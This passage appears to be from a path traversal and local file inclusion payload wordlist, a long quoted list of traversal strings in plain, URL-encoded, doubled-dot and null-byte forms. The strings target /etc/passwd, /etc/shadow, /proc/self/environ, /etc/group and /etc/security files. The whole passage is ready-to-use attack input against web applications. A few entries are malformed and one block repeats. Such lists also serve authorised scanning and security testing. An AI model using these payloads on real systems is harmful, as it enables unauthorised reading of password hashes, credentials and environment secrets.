2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F